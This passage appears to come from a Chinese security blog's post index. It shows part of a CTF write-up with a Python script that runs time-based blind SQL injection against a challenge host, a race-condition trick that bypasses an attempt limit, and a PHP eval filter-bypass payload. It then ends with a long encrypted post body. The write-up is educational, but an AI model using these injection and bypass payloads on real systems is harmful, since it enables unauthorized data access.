`&#123;$table&#125;` WHERE sleep(&#123;$randtime&#125;) OR `answer`='&#123;$answer&#125;';\") ); if(isset($result) &amp;&amp; $result['answer'] === $answer)&#123; mysqli_query($con, \"DROP TABLE `&#123;$table&#125;`;\"); echo $flag; &#125;else&#123; mysqli_query($con, \"UPDATE `&#123;$table&#125;` SET `count`=`count`+1;\"); echo 'Go fast'; &#125; 代码大概流程大概count=12或者table不存在的时候就建立新表重置count次数，然后知道answer相同时才会输出flag，限定了每轮只能尝试12次，之后answer就会变化且重置次数，但是题目存在逻辑漏洞，题目关键顺序是： 判断count的值—&gt;执行SQL语句—&gt;加count值 按照这个逻辑顺序，当count=11的时候，我们执行一个sleep()时间很长的语句，该请求就会长时间停在 执行SQL语句 流程中，如果此时我们再发起一次正常请求，判断count值还是11，执行完SQL语句之后count+1=12，再当上一条SQL语句执行完毕后count再加1等于13，于是之后就可以无限制提交请求了，然后在利用盲注来获得answer 123456789101112131415161718192021222324import requestskeys = '0123456789abcdef'header = &#123;\"Host\":\"iamslowly.thinkout.rf.gd\",\"Cache-Control\":\"max-age=0\",\"Upgrade-Insecure-Requests\":\"1\",\"User-Agent\":\"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\",\"Accept\":\"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\",\"Referer\":\"http://solveme.peng.kr/chall\",\"Accept-Language\":\"zh-CN,zh;q=0.8\",\"Cookie\":\"__test=8f5247d83ccd8573674837d6f9a37fd1\"&#125;payload = '440763269e2fe7a672a52ea827728'for i in range(30): for j in keys: url = \"http://iamslowly.thinkout.rf.gd/?i=1&amp;answer=' or if((answer like '&#123;&#125;%'),sleep(50),2)%23\".format(payload + j) try: content = requests.get(url,headers=header,timeout=30).content print(content[:10]) except: payload += j print(payload) break 这题目盲注时间有点长，这里贴一下结果 440763269e2fe7a672a52ea827728539 。 Check via eval 主要代码如下 1234567891011121314$exam = 'return\\''.sha1(time()).'\\';';if (!isset($_GET['flag'])) &#123; echo '&lt;a href=\"./?flag='.$exam.'\"&gt;Click here&lt;/a&gt;';&#125;else if (strlen($_GET['flag']) != strlen($exam)) &#123; echo 'Not allowed length';&#125;else if (preg_match('/`|\"|\\.|\\\\\\\\|\\(|\\)|\\[|\\]|_|flag|echo|print|require|include|die|exit/is', $_GET['flag'])) &#123; echo 'Not allowed keyword';&#125;else if (eval($_GET['flag']) === sha1($flag)) &#123; echo $flag;&#125; 题目过滤了括号，也基本过滤完了能用的函数，所以思路就是在 eval($_GET[&#39;flag&#39;]) 中让其直接输出flag，虽然题目过滤了flag，但是PHP文档中有如下内容 Click Here ，也就是说可以用 &lt;?= expression?&gt; 来达到绕过 echo 过滤的目的。 我们可以构造 &lt;?= flag?&gt; 来输出flag，尝试构造payload 1$a&#x3D;&#39;alag&#39;;$a&#123;0&#125;&#x3D;&#39;f&#39;;?&gt;11111111111111111;&lt;?&#x3D;$$a;?&gt;","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"萌宠养成记","slug":"Train-my-pet","date":"2018-07-24T10:35:04.000Z","updated":"2019-02-16T08:30:33.612Z","comments":true,"path":"2018/07/24/Train-my-pet/","link":"","permalink":"http://chaosec.top/2018/07/24/Train-my-pet/","excerpt":"The article has been encrypted, please enter your password to view.","text":"What's my pet's name? Incorrect Password! No content to display! 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